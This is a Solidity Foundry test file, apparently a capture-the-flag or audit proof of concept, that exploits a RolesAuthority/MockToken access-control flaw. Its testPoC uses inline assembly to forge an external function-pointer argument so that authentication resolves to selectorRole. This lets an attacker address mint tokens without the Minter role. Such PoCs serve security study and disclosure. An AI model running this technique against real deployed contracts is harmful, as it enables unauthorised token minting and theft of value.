// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "lib/forge-std/src/Test.sol";
import "src/RolesAuthority.sol";
import "src/MockToken.sol";

contract PoC is Test {
    address admin = vm.addr(1);
    address minter = vm.addr(2);
    address alice = vm.addr(3);
    address attacker = vm.addr(4);

    RolesAuthority rolesAuth;
    MockToken token;
    function(bytes4,address) external view returns (bool) authenticator;

    function setUp() external {
        // set up roles authority
        vm.startPrank(admin);
        rolesAuth = new RolesAuthority();
        rolesAuth.setAccountRole(minter, Role.Minter);
        rolesAuth.setSelectorRole(MockToken.mint.selector, Role.Minter);
        token = new MockToken(address(rolesAuth));
        vm.stopPrank();

        // set authenticator
        authenticator = rolesAuth.authenticate;

        // mint tokens
        vm.prank(minter);
        token.mint(authenticator, alice, 1 ether);
    }

    function testSmokeCheck() external {
        assertEq(rolesAuth.admin(), admin);
        assertEq(token.balanceOf(alice), 1 ether);
        assertEq(token.balanceOf(attacker), 0);
        assertEq(rolesAuth.selectorRole(MockToken.mint.selector).toUint8(), Role.Minter.toUint8());
        assertEq(rolesAuth.accountRole(minter).toUint8(), Role.Minter.toUint8());
        assertEq(rolesAuth.accountRole(attacker).toUint8(), Role.None.toUint8());
        assertTrue(rolesAuth.authenticate(MockToken.mint.selector, minter));
        assertFalse(rolesAuth.authenticate(MockToken.mint.selector, attacker));
    }

    function testPoC() external {
        vm.startPrank(attacker);
        // -- poc start --

        bytes4 selector1 = MockToken.mint.selector;
        bytes4 selector2 = 0x3fd40dac; // keccak(selectorRole(bytes4)), selectorRole(MockToken.mint.selector) == 1

        assembly {
            let p := mload(0x40)

            let r := shl(0x60, sload(rolesAuth.slot))
            r := or(r, shr(0xA0, selector2))

            mstore(p, selector1)
            mstore(add(p, 0x04), r)
            mstore(add(p, 0x24), sload(attacker.slot))
            mstore(add(p, 0x44), 0x01) // mint 1 token

            let success := call(gas(), sload(token.slot), 0, p, 0x64, 0, 0)
            if eq(success, 0) { 
                returndatacopy(p, 0, returndatasize())
                revert(p, returndatasize())
            }
        }
        
        // -- poc stop --
        __validate();
    }

    function __validate() internal {
        assertTrue(token.balanceOf(attacker) > 0);
    }
}